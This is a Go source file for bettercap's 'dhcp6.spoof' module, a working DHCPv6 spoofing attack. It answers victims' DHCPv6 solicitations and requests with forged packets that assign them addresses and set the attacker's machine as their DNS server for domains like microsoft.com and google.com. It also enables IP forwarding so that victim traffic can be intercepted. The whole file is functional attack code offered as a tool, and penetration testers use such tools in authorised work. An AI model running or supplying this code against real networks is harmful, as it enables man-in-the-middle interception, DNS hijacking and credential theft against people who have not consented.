package modules

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/bettercap/bettercap/core"
	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	// TODO: refactor to use gopacket when gopacket folks
	// will fix this > https://github.com/google/gopacket/issues/334
	"github.com/mdlayher/dhcp6"
	"github.com/mdlayher/dhcp6/dhcp6opts"
)

type DHCP6Spoofer struct {
	session.SessionModule
	Handle        *pcap.Handle
	DUID          *dhcp6opts.DUIDLLT
	DUIDRaw       []byte
	Domains       []string
	RawDomains    []byte
	waitGroup     *sync.WaitGroup
	pktSourceChan chan gopacket.Packet
}

func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
	spoof := &DHCP6Spoofer{
		SessionModule: session.NewSessionModule("dhcp6.spoof", s),
		Handle:        nil,
		waitGroup:     &sync.WaitGroup{},
	}

	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.domains",
		"microsoft.com, google.com, facebook.com, apple.com, twitter.com",
		``,
		"Comma separated values of domain names to spoof."))

	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof on", "",
		"Start the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return spoof.Start()
		}))

	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof off", "",
		"Stop the DHCPv6 spoofer in the background.",
		func(args []string) error {
			return spoof.Stop()
		}))

	return spoof
}

func (s DHCP6Spoofer) Name() string {
	return "dhcp6.spoof"
}

func (s DHCP6Spoofer) Description() string {
	return "Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/)."
}

func (s DHCP6Spoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (s *DHCP6Spoofer) Configure() error {
	var err error

	if s.Running() {
		return session.ErrAlreadyStarted
	}

	if s.Handle, err = pcap.OpenLive(s.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
		return err
	}

	err = s.Handle.SetBPFFilter("ip6 and udp")
	if err != nil {
		return err
	}

	if err, s.Domains = s.ListParam("dhcp6.spoof.domains"); err != nil {
		return err
	}

	s.RawDomains = packets.DHCP6EncodeList(s.Domains)

	if s.DUID, err = dhcp6opts.NewDUIDLLT(1, time.Date(2000, time.January, 1, 0, 0, 0, 0, time.UTC), s.Session.Interface.HW); err != nil {
		return err
	} else if s.DUIDRaw, err = s.DUID.MarshalBinary(); err != nil {
		return err
	}

	if s.Session.Firewall.IsForwardingEnabled() == false {
		log.Info("Enabling forwarding.")
		s.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (s *DHCP6Spoofer) dhcp6For(what dhcp6.MessageType, to dhcp6.Packet) (err error, p dhcp6.Packet) {
	err, p = packets.DHCP6For(what, to, s.DUIDRaw)
	if err != nil {
		return
	}

	p.Options.AddRaw(packets.DHCP6OptDNSServers, s.Session.Interface.IPv6)
	p.Options.AddRaw(packets.DHCP6OptDNSDomains, s.RawDomains)

	return nil, p
}

func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)

	fqdn := target.String()
	if raw, found := solicit.Options[packets.DHCP6OptClientFQDN]; found == true && len(raw) >= 1 {
		fqdn = string(raw[0])
	}

	log.Info("[%s] Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", core.Green("dhcp6"), core.Bold(fqdn), target, len(s.Domains))

	err, adv := s.dhcp6For(dhcp6.MessageTypeAdvertise, solicit)
	if err != nil {
		log.Error("%s", err)
		return
	}

	var solIANA dhcp6opts.IANA

	if raw, found := solicit.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := solIANA.UnmarshalBinary(raw[0]); err != nil {
		log.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	var ip net.IP
	if h, found := s.Session.Lan.Get(target.String()); found == true {
		ip = h.IP
	} else {
		log.Warning("Address %s not known, using random identity association address.", target.String())
		rand.Read(ip)
	}

	addr := fmt.Sprintf("%s%s", packets.IPv6Prefix, strings.Replace(ip.String(), ".", ":", -1))

	iaaddr, err := dhcp6opts.NewIAAddr(net.ParseIP(addr), 300*time.Second, 300*time.Second, nil)
	if err != nil {
		log.Error("Error creating IAAddr: %s", err)
		return
	}

	iaaddrRaw, err := iaaddr.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IAAddr: %s", err)
		return
	}

	opts := dhcp6.Options{dhcp6.OptionIAAddr: [][]byte{iaaddrRaw}}
	iana := dhcp6opts.NewIANA(solIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IANA: %s", err)
		return
	}

	adv.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := adv.MarshalBinary()
	if err != nil {
		log.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	eth := layers.Ethernet{
		SrcMAC:       s.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      s.Session.Interface.IPv6,
		DstIP:      pip6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	dhcp := packets.DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}
}

func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.Packet, target net.HardwareAddr) {
	log.Debug("Sending spoofed DHCPv6 reply to %s after its %s packet.", core.Bold(target.String()), toType)

	err, reply := s.dhcp6For(dhcp6.MessageTypeReply, req)
	if err != nil {
		log.Error("%s", err)
		return
	}

	var reqIANA dhcp6opts.IANA
	if raw, found := req.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
		log.Error("Unexpected DHCPv6 packet, could not find IANA.")
		return
	} else if err := reqIANA.UnmarshalBinary(raw[0]); err != nil {
		log.Error("Unexpected DHCPv6 packet, could not deserialize IANA.")
		return
	}

	var reqIAddr []byte
	if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found == true {
		reqIAddr = raw[0]
	} else {
		log.Error("Unexpected DHCPv6 packet, could not deserialize request IANA IAAddr.")
		return
	}

	opts := dhcp6.Options{dhcp6.OptionIAAddr: [][]byte{reqIAddr}}
	iana := dhcp6opts.NewIANA(reqIANA.IAID, 200*time.Second, 250*time.Second, opts)
	ianaRaw, err := iana.MarshalBinary()
	if err != nil {
		log.Error("Error serializing IANA: %s", err)
		return
	}
	reply.Options.AddRaw(dhcp6.OptionIANA, ianaRaw)

	rawAdv, err := reply.MarshalBinary()
	if err != nil {
		log.Error("Error serializing advertisement packet: %s.", err)
		return
	}

	pip6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
	eth := layers.Ethernet{
		SrcMAC:       s.Session.Interface.HW,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ip6 := layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      s.Session.Interface.IPv6,
		DstIP:      pip6.SrcIP,
	}

	udp := layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}

	udp.SetNetworkLayerForChecksum(&ip6)

	dhcp := packets.DHCPv6Layer{
		Raw: rawAdv,
	}

	err, raw := packets.Serialize(&eth, &ip6, &udp, &dhcp)
	if err != nil {
		log.Error("Error serializing packet: %s.", err)
		return
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}

	if toType == "request" {
		var addr net.IP
		if raw, found := reqIANA.Options[dhcp6.OptionIAAddr]; found == true {
			addr = net.IP(raw[0])
		}

		if h, found := s.Session.Lan.Get(target.String()); found == true {
			log.Info("[%s] IPv6 address %s is now assigned to %s", core.Green("dhcp6"), addr.String(), h)
		} else {
			log.Info("[%s] IPv6 address %s is now assigned to %s", core.Green("dhcp6"), addr.String(), target)
		}
	} else {
		log.Debug("DHCPv6 renew sent to %s", target)
	}
}

func (s *DHCP6Spoofer) duidMatches(dhcp dhcp6.Packet) bool {
	if raw, found := dhcp.Options[dhcp6.OptionServerID]; found == true && len(raw) >= 1 {
		if bytes.Compare(raw[0], s.DUIDRaw) == 0 {
			return true
		}
	}
	return false
}

func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
	var dhcp dhcp6.Packet
	var err error

	udp := pkt.Layer(layers.LayerTypeUDP).(*layers.UDP)
	if udp == nil {
		return
	}

	// we just got a dhcp6 packet?
	if err = dhcp.UnmarshalBinary(udp.Payload); err == nil {
		eth := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)

		switch dhcp.MessageType {
		case dhcp6.MessageTypeSolicit:

			s.dhcpAdvertise(pkt, dhcp, eth.SrcMAC)

		case dhcp6.MessageTypeRequest:
			if s.duidMatches(dhcp) {
				s.dhcpReply("request", pkt, dhcp, eth.SrcMAC)
			}

		case dhcp6.MessageTypeRenew:
			if s.duidMatches(dhcp) {
				s.dhcpReply("renew", pkt, dhcp, eth.SrcMAC)
			}
		}
	}
}

func (s *DHCP6Spoofer) Start() error {
	if err := s.Configure(); err != nil {
		return err
	}

	return s.SetRunning(true, func() {
		s.waitGroup.Add(1)
		defer s.waitGroup.Done()

		src := gopacket.NewPacketSource(s.Handle, s.Handle.LinkType())
		s.pktSourceChan = src.Packets()
		for packet := range s.pktSourceChan {
			if s.Running() == false {
				break
			}

			s.onPacket(packet)
		}
	})
}

func (s *DHCP6Spoofer) Stop() error {
	return s.SetRunning(false, func() {
		s.pktSourceChan <- nil
		s.Handle.Close()
		s.waitGroup.Wait()
	})
}
